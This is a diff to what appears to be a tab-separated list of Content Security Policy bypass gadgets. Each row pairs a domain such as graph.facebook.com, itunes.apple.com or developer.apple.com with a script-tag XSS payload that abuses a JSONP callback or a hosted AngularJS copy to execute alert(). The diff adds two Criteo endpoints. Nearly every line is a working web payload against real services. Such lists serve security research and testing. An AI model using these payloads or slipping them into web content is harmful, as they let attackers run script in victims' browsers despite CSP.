@@ -34,6 +34,7 @@ connect.mail.ru	<script src="https://connect.mail.ru/share_count?url_list=x&call
 d.adroll.com	<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>	
 d1xrp9zhb3ks3c.cloudfront.net	<body ng-app ng-csp><script src="https://d1xrp9zhb3ks3c.cloudfront.net/web/changessalon/node_modules/angular/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	renniepak
 developer.apple.com	<body ng-app ng-csp><script src="https://developer.apple.com/search/scripts/vendor/angular-custom.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	renniepak
+dynamic.criteo.com	<script src="https://dynamic.criteo.com/js/ld/s2s.js?p=1&c=1&j=alert"></script>	renniepak
 elysiumwebsite.s3.amazonaws.com	<body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>	
 eu.battle.net	<script src="https://eu.battle.net/support/update/json?callback=alert"></script>	renniepak
 fast.wistia.com	<script src="https://fast.wistia.com/embed/medias/o75jtw7654.json?callback=alert"></script>	renniepak
@@ -42,6 +43,7 @@ gist.github.com	<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c4
 global.apis.naver.com	<script src="https://global.apis.naver.com/commentBox/cbox/web_neo_list_jsonp.json?_callback=alert"></script>	renniepak
 graph.facebook.com	<script src="https://graph.facebook.com/?id=1337&callback=alert"></script>	kevin_mizu
 gstatic.com	<body ng-app ng-csp><script src="//gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	
+gum.criteo.com	<script src="https://gum.criteo.com/sync?c=123&r=2&a=1&j=alert"></script>	renniepak
 inno.blob.core.windows.net	<body ng-app ng-csp><script src="//inno.blob.core.windows.net/new/libs/AngularJS/1.2.1/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>	renniepak
 itunes.apple.com	<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>	renniepak
 mango.buzzfeed.com	<script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>	
